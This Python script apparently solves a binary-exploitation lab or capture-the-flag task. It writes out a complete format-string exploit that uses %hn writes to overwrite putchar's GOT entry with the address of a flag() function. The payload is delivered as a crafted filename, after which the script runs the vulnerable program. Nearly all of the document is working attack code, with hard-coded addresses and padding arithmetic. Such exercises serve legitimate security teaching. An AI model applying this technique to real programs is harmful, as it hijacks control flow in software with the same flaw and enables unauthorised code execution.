#!/usr/bin/env python3
"""
Task 2: Invoke flag() by overwriting putchar@GOT via format string %hn.

Creates task2/ directory, copies vuln + flag.txt into it,
renames flag.txt to the crafted payload filename, then runs vuln.

The filename content ("Welcome") stays the same - only the NAME changes.
"""
import os
import sys
import shutil
import struct

# ---- Configuration ----
TASK_DIR    = "task2"
VULN        = "vuln"
FLAGFILE    = "flag.txt"
FLAG_ADDR   = 0x08049226   # address of flag() function
PUTCHAR_GOT = 0x0804c030   # GOT entry for putchar
OFFSET      = 4            # buffer at printf's 4th stack position

# ---- Generate payload (= crafted filename) ----
high_half = (FLAG_ADDR >> 16) & 0xFFFF   # 0x0804 = 2052
low_half  = FLAG_ADDR & 0xFFFF           # 0x9226 = 37414

addr_high = struct.pack("<I", PUTCHAR_GOT + 2)  # 0x0804c032 -> pos 4
addr_low  = struct.pack("<I", PUTCHAR_GOT)       # 0x0804c030 -> pos 5

bytes_written = 8
pad1 = high_half - bytes_written    # 2052 - 8 = 2044
pad2 = low_half - high_half         # 37414 - 2052 = 35362

payload  = addr_high + addr_low                      # 8 bytes: two GOT addresses
payload += f"%1${pad1}x".encode()                     # pad output to 2052 total
payload += f"%{OFFSET}$hn".encode()                   # write 0x0804 to GOT+2
payload += f"%1${pad2}x".encode()                     # pad output to 37414 total
payload += f"%{OFFSET + 1}$hn".encode()               # write 0x9226 to GOT
payload += b".txt"                                     # required for strstr match

print(f"[+] Payload: {payload}")
print(f"[+] Payload length: {len(payload)} bytes")
print(f"[+] flag() = {hex(FLAG_ADDR)}, putchar@GOT = {hex(PUTCHAR_GOT)}")
print(f"[+] Write {hex(high_half)} to {hex(PUTCHAR_GOT+2)}, {hex(low_half)} to {hex(PUTCHAR_GOT)}")

# ---- Save payload_2 for submission ----
with open("payload_2", "wb") as f:
    f.write(payload)
print(f"[+] Saved raw payload to: payload_2")

# ---- Set up directory ----
if os.path.exists(TASK_DIR):
    shutil.rmtree(TASK_DIR)
os.makedirs(TASK_DIR)
print(f"[+] Created directory: {TASK_DIR}/")

shutil.copy2(VULN, TASK_DIR)
shutil.copy2(FLAGFILE, TASK_DIR)
os.chmod(os.path.join(TASK_DIR, VULN), 0o755)
print(f"[+] Copied {VULN} and {FLAGFILE} into {TASK_DIR}/")

# ---- Rename flag.txt to crafted payload filename ----
src = os.path.join(TASK_DIR, FLAGFILE)
dst = os.path.join(TASK_DIR.encode(), payload)
os.rename(src.encode(), dst)
print(f"[+] Renamed {FLAGFILE} -> crafted payload filename")
print(f"[+] File content remains: 'Welcome'")

# ---- Run vuln ----
print(f"\n[*] Running ./{VULN} in {TASK_DIR}/")
print("=" * 50)
os.chdir(TASK_DIR)
os.system(f"./{VULN}")
print("=" * 50)
print("[*] We will see: '[+] Exploit Successful! Welcome, elite hacker.'")
